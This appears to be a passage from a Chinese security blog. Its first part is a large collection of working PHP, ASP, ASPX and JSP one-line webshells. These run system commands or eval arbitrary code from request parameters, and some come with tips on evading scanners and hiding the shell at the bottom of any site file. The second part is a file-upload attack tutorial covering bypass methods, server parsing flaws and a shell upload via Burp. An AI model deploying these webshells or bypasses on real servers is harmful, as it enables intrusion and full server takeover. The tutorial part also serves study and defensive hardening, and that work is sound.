<span class="token variable">$func</span> <span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token single-quoted-string string">''</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">//?func=system&amp;cmd=whoami</span>
<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//print_r($new_array);</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//?cmd=phpinfo()</span>
@<span class="token function">call_user_func</span><span class="token punctuation">(</span>assert<span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//?cmd=phpinfo()</span>
<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
<span class="token function">call_user_func_array</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token comment">//?func=system&amp;cmd=whoami</span>
<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$func</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>

<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'asse'</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'rt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> php环境>=&lt;5.6才能用
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">usort</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>  php环境>=5.6才能用
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token punctuation">(</span><span class="token variable">$_</span><span class="token operator">=</span>@<span class="token variable">$_GET1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>@<span class="token variable">$_</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">eval_r</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>//容错代码 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_POST1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>//使用Lanker一句话客户端的专家模式执行相关的PHP语句 
<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> @<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[email]/e"</span><span class="token punctuation">,</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>/*使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入*/:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>O</span><span class="token punctuation">></span></span>h=@eval_r($_POST1);<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>O</span><span class="token punctuation">></span></span> 
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> `<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'r'</span><span class="token punctuation">]</span>` <span class="token delimiter important">?></span></span> 

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">@<span class="token function">eval_r</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span>sb<span class="token punctuation">]</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> //绕过<span class="token php language-php"><span class="token delimiter important">&lt;?</span>限制的一句话

<span class="token operator">&lt;</span><span class="token operator">?</span>php <span class="token punctuation">(</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span>   上面这句是防杀防扫的！网上很少人用！可以插在网页任何ASP文件的最底部不会出错，比如 index.asp里面也是可以的！

<span class="token php language-php"><span class="token delimiter important">&lt;?</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> system <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> 
加了判断的PHP一句话，与上面的ASP一句话相同道理，也是可以插在任何PHP文件 的最底部不会出错！

&lt;%execute request(“class”)%>&lt;%'&lt;% loop &lt;%:%>&lt;%'&lt;% loop &lt;%:%>&lt;%execute request (“class”)%>&lt;%execute request(“class”)'&lt;% loop &lt;%:%> 
无防下载表，有防下载表可尝试插入以下语句突破的一句话 

&lt;%eval(request(“1″)):response.end%> 备份专用</code></pre>

<pre class="language-jsp" data-language="jsp"><code class="language-jsp">##JSP：
&lt;%if(request.getParameter(&quot;f&quot;)!&#x3D;null)(newjava.io.FileOutputStream (application.getRealPath(&quot;\\&quot;)+request.getParameter(&quot;f&quot;))).write (request.getParameter(&quot;t&quot;).getBytes());%&gt; 
提交客户端 
&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;&lt;textareaname&#x3D;&quot;t&quot;&gt;&lt;&#x2F;textarea&gt;&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;submit&quot;value&#x3D;&quot;提交&quot;&gt;&lt;&#x2F;form&gt;</code></pre>

<pre class="language-asp" data-language="asp"><code class="language-asp">##ASP
&lt;%eval(Request.Item[&quot;r00ts&quot;],”unsafe”);%&gt;

&lt;%IfRequest(“1″)&lt;&gt;”&quot;ThenExecuteGlobal(Request(“1″))%&gt; 

&lt;%execute(request(“1″))%&gt; 

&lt;scriptrunat&#x3D;server&gt;execute request(“1″)&lt;&#x2F;script&gt; 不用&#39;&lt;,&gt;‘的asp一句话 </code></pre>

<pre class="language-aspx" data-language="aspx"><code class="language-aspx">##aspx
&lt;scriptrunat&#x3D;”server”&gt;WebAdmin2Y.x.y aaaaa &#x3D;newWebAdmin2Y.x.y (“add6bb58e139be10″);&lt;&#x2F;script&gt; 

&lt;script language&#x3D;&quot;C#&quot;runat&#x3D;&quot;server&quot;&gt;WebAdmin2Y.x.y a&#x3D;new WebAdmin2Y.x.y(&quot;add6bb58e139be10&quot;)&lt;&#x2F;script&gt; 

&lt;%eval request(chr(35))%&gt;  不用双引号的一句话。</code></pre>


<h1 id="文件上传的攻击与防御方法"><a href="#文件上传的攻击与防御方法" class="headerlink" title="文件上传的攻击与防御方法"></a>文件上传的攻击与防御方法</h1><h2 id="本地前端限制"><a href="#本地前端限制" class="headerlink" title="本地前端限制"></a>本地前端限制</h2><pre class="language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> file <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementsByName</span><span class="token punctuation">(</span><span class="token string">'upload_file'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>file <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> file <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请选择要上传的文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">//定义允许上传的文件类型</span>
    <span class="token keyword">var</span> allow_ext <span class="token operator">=</span> <span class="token string">".jpg|.png|.gif"</span><span class="token punctuation">;</span>
    <span class="token comment">//提取上传文件的类型</span>
    <span class="token keyword">var</span> ext_name <span class="token operator">=</span> file<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//判断上传文件类型是否允许上传</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>allow_ext<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>ext_name <span class="token operator">+</span> <span class="token string">"|"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> errMsg <span class="token operator">=</span> <span class="token string">"该文件不允许上传，请上传"</span> <span class="token operator">+</span> allow_ext <span class="token operator">+</span> <span class="token string">"类型的文件,当前文件类型为："</span> <span class="token operator">+</span> ext_name<span class="token punctuation">;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span>errMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在表单中使用onsumbit=checkFile()调用js函数来检查上传文件的扩展名。当用户在客户端选择文件点击上传的时候，客户端还没有向服务器发送任何消息，就对本地文件进行检测来判断是否是可以上传的类型，这种方式称为前台脚本检测扩展名。</p>
<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>这种限制很简单，通过浏览器F12很简单的修改文件后缀名就可以完成绕过检查，或者是讲木马修改后缀名后上传，通过改包工具修改上传。如果是JS脚本检测，在本地浏览器客户端禁用JS即可。可使用火狐浏览器的NoScript插件、IE中禁用掉JS等方式实现绕过。</p>
<h3 id="操作方法"><a href="#操作方法" class="headerlink" title="操作方法"></a>操作方法</h3><p>准备一句话木马：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>并且修改后缀名为jpg，上传操作，通过burpsuit抓包改包，使其后缀名修改回php。</p>
<h2 id="服务器检测扩展名"><a href="#服务器检测扩展名" class="headerlink" title="服务器检测扩展名"></a>服务器检测扩展名</h2><p>就是在文件被上传到服务端的时候，对于文件名的扩展名进行检查，如果不合法，则拒绝这次上传<br>在检查扩展名是否合法的时候，有两种策略：</p>
<h3 id="黑名单策略"><a href="#黑名单策略" class="headerlink" title="黑名单策略"></a>黑名单策略</h3><p>文件扩展名在黑名单中的为不合法</p>
<p>示例：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'.asp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.aspx'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.php'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'.jsp'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//收尾去空</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'/'</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">,</span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>            
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                 <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token single-quoted-string string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="白名单策略"><a href="#白名单策略" class="headerlink" title="白名单策略"></a>白名单策略</h3><p>文件扩展名不在白名单中的均为不合法</p>
<p>示例：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$ext_arr</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'jpg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'png'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'gif'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'save_path'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"/"</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span><span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'上传出错！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>当浏览器将文件提交到服务器端的时候，服务器端会根据设定的黑白名单对浏览器提交上来的文件扩展名进行检测，如果上传的文件扩展名不符合黑白名单的限制，则不予上传，否则上传成功。</p>
<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><p>在一些Web server中，存在解析漏洞:</p>
<pre><code>1. 老版本的IIS6中的目录解析漏洞，如果网站目录中有一个 /.asp/目录，那么此目录下面的一切内容都会被当作asp脚本来解析

2. 老版本的IIS6中的分号漏洞：IIS在解析文件名的时候可能将分号后面的内容丢弃，那么我们可以在上传的时候给后面加入分号内容
来避免黑名单过滤，如 a.asp;jpg

3. 旧版Windows Server中存在空格和dot漏洞类似于 a.php. 和 a.php[空格] 这样的文件名存储后会被windows去掉点和空格，从而使
得加上这两个东西可以突破过滤，成功上传，并且被当作php代码来执行

4. nginx(0.5.x, 0.6.x, 0.7 &lt;= 0.7.65, 0.8 &lt;= 0.8.37)空字节漏洞 xxx.jpg%00.php 这样的文件名会被解析为php代码运行
（fastcgi会把这个文件当php看，不受空字节影响，但是检查文件后缀的那个功能会把空字节后面的东西抛弃，所以识别为jpg）

5. apache1.x,2.x的解析漏洞，上传如a.php.rar a.php.gif 类型的文件名，可以避免对于php文件的过滤机制，但是由于apache在解析
文件名的时候是从右向左读，如果遇到不能识别的扩展名则跳过，rar等扩展名是apache不能识别的，因此就会直接将类型识别为php，
从而达到了注入php代码的目的</code></pre>
<h2 id="服务器检测MIME"><a href="#服务器检测MIME" class="headerlink" title="服务器检测MIME"></a>服务器检测MIME</h2><p>原理 检查Content-Type</p>
<p>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，来识别文件类型，这个动作是由浏览器完成的，服务端可以检查此类型不过这仍然是不安全的,因为HTTP header可以被发出者或者中间人任意的修改。</p>
<h3 id="常见类型"><a href="#常见类型" class="headerlink" title="常见类型"></a>常见类型</h3><table>
    <tr>
        <th>文件后缀</th>
        <th>Mime类型</th>
        <th>说明</th>
    </tr>
    <tr>
        <td>.flv</td>
        <td>flv/flv-flash</td>
        <td>在线播放</td>
    </tr>
    <tr>
        <td>.html或.htm</td>
        <td>text/html</td>
        <td>超文本标记语言文本</td>
    </tr>
    <tr>
        <td>.rtf</td>
        <td>application/rtf</td>
        <td>RTF文本</td>
    </tr>
    <tr>
        <td>.gif 或.png</td>
        <td>image/gif(image/png)</td>
        <td>GIF图形/PNG图片</td>
    </tr>
    <tr>
        <td>.jpeg或.jpg</td>
        <td>image/jpeg</td>
        <td>JPEG图形</td>
    </tr>
    <tr>
        <td>.au</td>
        <td>audio/basic</td>
        <td>au声音文件</td>
    </tr>
    <tr>
        <td>.mid或.midi</td>
        <td>audio/midi或audio/x-midi</td>
        <td>MIDI音乐文件</td>
    </tr>
    <tr>
        <td>.ra或.ram或.rm</td>
        <td>audio/x-pn-realaudio</td>
        <td>RealAudio音乐文件</td>
    </tr>
    <tr>
        <td>.mpg或.mpeg或.mp3</td>
        <td>video/mpeg</td>
        <td>MPEG文件</td>
    </tr>
    <tr>
        <td>.avi</td>
        <td>video/x-msvideo</td>
        <td>AVI文件</td>
    </tr>
    <tr>
        <td>.gz</td>
        <td>application/x-gzip</td>
        <td>GZIP文件</td>
    </tr>
    <tr>
